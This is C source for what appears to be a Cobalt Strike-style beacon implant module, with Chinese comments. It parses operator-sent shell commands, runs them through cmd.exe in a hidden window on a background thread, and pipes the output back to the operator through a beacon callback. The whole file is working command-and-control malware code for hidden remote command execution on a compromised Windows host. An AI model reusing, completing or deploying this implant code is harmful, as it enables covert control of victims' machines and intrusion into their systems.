#include "Command.h"
#include "Shell.h"

CommandShell parse_command(unsigned char* cmdBuffer, int cmdBufferLength) {
    // pathLength(4 Bytes) || path(pathLength Bytes) || cmdLength(4 Bytes) ||  cmd(cmdLength Bytes)
	datap parser;
	BeaconDataParse(&parser, cmdBuffer, cmdBufferLength);
	unsigned char* path = BeaconDataStringPointer(&parser);    // %COMSPEC%
	unsigned char* cmdArgs = BeaconDataStringPointer(&parser); // /C whoami
    unsigned char* envKey = str_replace_all(path, "%", "");
	unsigned char* cmdPathFromEnv = getenv(envKey);            // C:\WINDOWS\system32\cmd.exe

    CommandShell shell;
    shell.shellPath = cmdPathFromEnv;
    shell.shellBuf = cmdArgs;

    return shell;
}

DWORD WINAPI ThreadCmdRun(LPVOID lpParam) {
    // there is nothing
    // todo
}

DWORD WINAPI ThreadCmdshell(LPVOID lpParam) {
    Sleep(2000);

    unsigned char* buffer = NULL;
    BOOL bRet = FALSE;

    unsigned char* post_buffer = NULL;

    PROCESS_INFORMATION pi = { 0 };

    struct ShellThreadArgs* args = (struct ShellThreadArgs*)lpParam;
    unsigned char* cmd_buffer = args->cmd_buffer;
    size_t cmd_length = args->cmd_length;

    HANDLE hReadPipe = NULL;
    HANDLE hWritePipe = NULL;

	// 第三个参数为 TRUE 表示子进程可以继承管道句柄
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };

    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        fprintf(stderr, "CreatePipe failed with error:%lu\n", GetLastError());
        goto cleanup;
    }

    STARTUPINFO si = { 0 };
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.cb = sizeof(STARTUPINFO);
    si.hStdError = hWritePipe;
    si.hStdOutput = hWritePipe;
    si.wShowWindow = SW_HIDE;

    CommandShell shell = parse_command(cmd_buffer, cmd_length);
    unsigned char* shellPath = shell.shellPath;
    unsigned char* shellBuf = shell.shellBuf;

    char commandLine[MAX_PATH];
    // C:\WINDOWS\system32\cmd.exe /C whoami
    snprintf(commandLine, MAX_PATH, "%s %s", shellPath, shellBuf);

    // 执行结果将写入 hWritePipe 
    if (!CreateProcessA(NULL, commandLine, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        fprintf(stderr, "CreateProcessA failed with error:%lu\n", GetLastError());
        goto cleanup;
    }

	DWORD numberOfBytesRead = 0;
    DWORD size = 1024 * 10;
	BOOL first_time = TRUE;
    buffer = (unsigned char*)malloc(size);
    if (!buffer) {
        fprintf(stderr, "Memory allocation failed\n");
        goto cleanup;
    }
    
	// 关闭父进程管道句柄，必须关闭，否则在 hWritePipe 没有数据的情况下 ReadFile 会阻塞
    if(CloseHandle(hWritePipe) == FALSE) {
        fprintf(stderr, "CloseHandle failed with error:%lu\n", GetLastError());
        goto cleanup;
	}

    while (TRUE) {
        Sleep(5000);

        if(!ReadFile(hReadPipe, buffer, size, &numberOfBytesRead, NULL)) {
            DWORD error_code = GetLastError();
            // hWritePipe 句柄关闭后，没有数据则出现 ERROR_BROKEN_PIPE
            if (error_code == ERROR_BROKEN_PIPE) {
                post_buffer = malloc(strlen(g_end_string));
                if(!post_buffer) {
                    fprintf(stderr, "Memory allcation failed\n");
                    goto cleanup;
				}
                memcpy(post_buffer, g_end_string, strlen(g_end_string));
                DataProcess(post_buffer, strlen(g_end_string), CALLBACK_OUTPUT);
                break;
            }
            else {
                fprintf(stderr, "ReadFile failed with error:%lu\n", GetLastError());
                goto cleanup;
            }
		}
        else {
            if(numberOfBytesRead > 0) {
                if (first_time) {
                    post_buffer = (unsigned char*)malloc(numberOfBytesRead);
                    if (post_buffer && buffer) {
                        memcpy(post_buffer, buffer, numberOfBytesRead);
                        DataProcess(post_buffer, numberOfBytesRead, CALLBACK_OUTPUT);
                    }
                    free(post_buffer);
                    first_time = FALSE;
                }
                else {
                    char prefix[MAX_PATH];   
                    snprintf(prefix, MAX_PATH, "[*] %s:\n", commandLine);
                    DataProcess(prefix, strlen(prefix), CALLBACK_OUTPUT);

                    post_buffer = (unsigned char*)malloc(numberOfBytesRead);
                    if (post_buffer && buffer) {
                        memcpy(post_buffer, buffer, numberOfBytesRead);
                        DataProcess(post_buffer, numberOfBytesRead, CALLBACK_OUTPUT);                    
                    }
                    free(post_buffer);
                }
			}
        }
    }
    bRet = TRUE;

cleanup:
    if(pi.hThread != INVALID_HANDLE_VALUE)   CloseHandle(pi.hThread);
    if(pi.hProcess != INVALID_HANDLE_VALUE)  CloseHandle(pi.hProcess);
    if(hReadPipe != INVALID_HANDLE_VALUE)    CloseHandle(hReadPipe);
    if (buffer) free(buffer);
    free(args->cmd_buffer);
    free(args);
    return bRet;
}

VOID CmdShell(unsigned char* command_buffer, size_t command_length) { 
	// 解决线程运行但 command_buffer 可能被释放的问题
    struct ShellThreadArgs* args = malloc(sizeof(struct ShellThreadArgs));
    if (!args) {
		fprintf(stderr, "Memory allocation failed\n");
        return;
    }

    datap parser;
    BeaconDataParse(&parser, command_buffer, command_length);

    args->cmd_buffer = (unsigned char*)malloc(command_length);
    if(!args->cmd_buffer) {
        fprintf(stderr, "Memory allocation failed\n");
        free(args);
        return;
	}

    memcpy(args->cmd_buffer, BeaconDataPtr(&parser, command_length), command_length);
    args->cmd_length = command_length;

    CommandShell shell = parse_command(args->cmd_buffer, args->cmd_length);
    HANDLE myThread;

    // 这个分支 shell 指令不会进入, 在执行 winrm 功能时会进入此分支执行一个powershell命令
    if (shell.shellPath == NULL) {
        myThread = CreateThread(
            NULL,                       // 默认线程安全性
            0,                          // 默认堆栈大小
            ThreadCmdRun,               // 线程函数
            args,                       // 传递给线程函数的参数
            0,                          // 默认创建标志
            NULL);                      // 不存储线程ID
        if (myThread == NULL) {
            fprintf(stderr, "CeateThread failed with error: %lu\n", GetLastError());
			free(args->cmd_buffer);
            free(args);
            return;
        }
    }
    else {
        // shell 指令进来的应该都是进入下面分支
        myThread = CreateThread(
            NULL,                       // 默认线程安全性
            0,                          // 默认堆栈大小
            ThreadCmdshell,             // 线程函数
            args,                       // 传递给线程函数的参数
            0,                          // 默认创建标志
            NULL);                      // 不存储线程ID
        if (myThread == NULL) {
            fprintf(stderr, "CeateThread failed with error: %lu\n", GetLastError());
            free(args->cmd_buffer);
            free(args);
            return;
        }
        // 异步执行
		// 不使用 WaiteForSingleObject
        // WaitForSingleObject(myThread, INFINITE);
        CloseHandle(myThread);
    }
}
